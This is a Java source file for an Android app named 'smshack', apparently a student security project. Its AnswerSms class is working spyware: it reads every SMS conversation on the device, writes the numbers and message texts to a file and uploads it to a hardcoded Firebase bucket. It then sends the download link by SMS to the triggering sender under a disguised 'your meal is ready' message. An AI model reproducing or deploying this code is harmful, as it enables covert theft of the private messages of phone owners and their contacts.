package com.projet.esgi.smshack.service;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.projet.esgi.smshack.Data.Conversation;
import com.projet.esgi.smshack.Data.SMS;
import com.projet.esgi.smshack.Data.SMSProvider;
import com.projet.esgi.smshack.Model.SmsModel;

import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Created by ASIF on 07/02/2017.
 */

public class AnswerSms {

    // TODO: 07/02/2017 change no tel
    private static final String noTel = "+33786280684";
    private static final String url = "gs://securitemobile-29daf.appspot.com";
    OutputStreamWriter outputStreamWriter;
    private SmsModel smsModel;
    private SMSProvider smsProvider;
    private SmsManager smsManager;
    private Handler handler;
    private Context context;

    Runnable runnable = new Runnable() {
        @Override
        public void run() {

            try {
                // get sms conversation list
                List<Conversation> listeSMSInbox = smsProvider.getConversations();

                // create file to write sms data
                outputStreamWriter = new OutputStreamWriter(context.openFileOutput("smsHack.txt", Context.MODE_PRIVATE));

                for (Conversation c : listeSMSInbox) {

                    outputStreamWriter.write("*************************************************\n");
                    outputStreamWriter.write("////////// N° : " + c.getAddress() + " ////////// \n");

                    List<SMS> sms = smsProvider.getSMSForConversation(c.getThreadId());

                    for (SMS s : sms) {

                        outputStreamWriter.write(" - " + s.getBody() + "\n");

                    }

                    outputStreamWriter.write("*************************************************\n");
                }

                outputStreamWriter.close();

                // get time and date for file name
                DateFormat df = new SimpleDateFormat("dd.MM.yyyy_HH:mm");
                String date = df.format(Calendar.getInstance().getTime());

                String fileName = "smsHack_" + date + ".txt";

                // firebase storage init
                FirebaseStorage storage = FirebaseStorage.getInstance();
                StorageReference storageReference = storage.getReferenceFromUrl(url).child(fileName);

                // open file
                InputStream inputStream = context.openFileInput("smsHack.txt");

                // upload file to firebase serveur
                UploadTask uploadTask = storageReference.putStream(inputStream);

                uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {

                        // get downloadable link for the uploaded file
                        Uri donwloadUri = taskSnapshot.getDownloadUrl();

                        if (donwloadUri != null) {
                            Log.i("smsHack", "Url : " + donwloadUri.toString());
                            sendSMS("Votre repas est prêt, pour déguster clique sur le lien : \n" + donwloadUri.toString());
                        }
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.i("smsHack", "onFail : ");
                        e.printStackTrace();
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };


    public AnswerSms(Context context, SmsModel smsModel) {
        this.context = context;
        this.smsModel = smsModel;
        smsProvider = new SMSProvider(context.getContentResolver());
        smsManager = SmsManager.getDefault();
        handler = new Handler();
        handler.post(runnable);
    }

    private void sendSMS(String msg) {
        Log.i("smsHack", "Sending sms");
        ArrayList<String> parts = smsManager.divideMessage(msg);
        smsManager.sendMultipartTextMessage(smsModel.getOriginAdress(), null, parts, null, null);
    }
}

